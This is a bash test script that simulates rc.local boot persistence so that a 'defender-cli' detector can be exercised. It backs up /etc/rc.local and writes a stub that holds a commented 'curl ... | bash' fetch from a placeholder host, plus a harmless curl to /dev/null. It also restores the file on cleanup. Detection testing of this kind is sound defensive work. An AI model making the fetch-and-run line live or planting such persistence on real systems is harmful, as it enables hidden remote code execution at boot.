#!/usr/bin/env bash
# rc.local persistence: a payload inserted into /etc/rc.local.
# On Arch the file just needs to exist and be executable; rc-local.service
# in systemd-compat handles running it at boot.
# Detected by: defender-cli anti-persistence --rc-local
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

RC="/etc/rc.local"
BACKUP="/tmp/defender-test-rc-local.bak"

case "${1:-}" in
  deploy)
    [[ -f "$RC" ]] && cp "$RC" "$BACKUP"
    cat > "$RC" << 'EOF'
#!/bin/sh
# DEFENDER-TEST — simulated rc.local persistence
# curl -s http://10.0.0.1/payload.sh | bash
curl -s http://10.0.0.1/payload.sh -o /dev/null 2>/dev/null || true
exit 0
EOF
    chmod +x "$RC"
    echo "[+] 04_rc_local: $RC written with simulated payload"
    ;;
  cleanup)
    if [[ -f "$BACKUP" ]]; then
      mv "$BACKUP" "$RC"
      echo "[-] 04_rc_local: $RC restored from backup"
    else
      printf '#!/bin/sh\nexit 0\n' > "$RC"
      echo "[-] 04_rc_local: $RC neutralised"
    fi
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
